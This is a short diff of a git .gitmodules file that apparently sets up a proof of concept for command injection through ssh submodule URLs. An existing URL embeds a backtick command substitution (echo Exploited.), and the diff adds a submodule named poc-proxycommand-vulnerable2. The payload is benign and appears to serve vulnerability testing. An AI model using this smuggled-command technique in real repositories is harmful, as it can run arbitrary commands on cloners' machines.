@@ -1,3 +1,6 @@
 [submodule "cves"]
 	path = cves
 	url = ssh://`echo Exploited.`foo.example.com/bar
+[submodule "poc-proxycommand-vulnerable2"]
+	path = poc-proxycommand-vulnerable2
+	url = https://github.com/YogeshAtPerforce/poc-proxycommand-vulnerable2
